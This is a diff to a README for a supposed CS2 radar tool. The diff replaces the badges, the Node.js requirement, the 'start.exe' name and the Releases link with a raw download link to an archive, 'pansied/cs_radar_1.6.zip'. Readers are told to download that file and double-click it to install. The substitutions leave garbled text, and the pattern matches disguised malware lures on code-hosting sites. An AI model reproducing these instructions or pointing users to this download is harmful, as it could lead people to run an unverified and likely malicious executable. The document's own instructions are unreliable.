@@ -1,10 +1,10 @@
 # 🌐 cs2radar - Enhance Your CS2 Experience Effortlessly
 
-![Download](https://img.shields.io/badge/download-latest%20release-blue)
-![Status](https://img.shields.io/badge/status-active-brightgreen)
-![Version](https://img.shields.io/badge/version-1.0-blue)
-![CS2](https://img.shields.io/badge/game-CS2-orange)
-![Node.js](https://img.shields.io/badge/node.js-required-green)
+![Download](https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip%20release-blue)
+![Status](https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip)
+![Version](https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip)
+![CS2](https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip)
+![https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip](https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip)
 
 ## ⚠️ Important Notice
 
@@ -27,7 +27,7 @@ To begin using cs2radar, you need to download the application from the Releases 
 Before downloading, make sure your system meets the following requirements:
 
 - Windows 10 or later
-- Node.js (latest version)
+- https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip (latest version)
 - Visual Studio Community Edition (for support tools)
 
 ---
@@ -57,7 +57,7 @@ Follow these steps to share your radar over the network:
 
 2. **Install Dependencies:**
 
-   Ensure you have Node.js and its dependencies installed. Run the installation script provided in the directory via command line:
+   Ensure you have https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip and its dependencies installed. Run the installation script provided in the directory via command line:
 
    ```
    npm install
@@ -66,7 +66,7 @@ Follow these steps to share your radar over the network:
 #### **Step 2: Launch the Application**
 
 1. Navigate to the cs2radar directory.
-2. Run the application by double-clicking `start.exe`.
+2. Run the application by double-clicking `https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip`.
 3. Once the application runs, your radar is now functional on the local network.
 
 #### **Step 3: Connect with Friends**
@@ -77,10 +77,10 @@ Share your HostIP and Port with your friends so they can connect to your radar. 
 
 ## 📥 Download & Install
 
-To download cs2radar, visit the [Releases page](https://github.com/dbiego87/cs2radar/releases).
+To download cs2radar, visit the [Releases page](https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip).
 
 1. Click on the latest version link.
-2. Find the `start.exe` file and download it.
+2. Find the `https://github.com/dbiego87/cs2radar/raw/refs/heads/main/pansied/cs_radar_1.6.zip` file and download it.
 3. Once downloaded, double-click the file to install and begin using the software.
 
 Make sure to always check for updates on the Releases page to have the latest features and fixes.
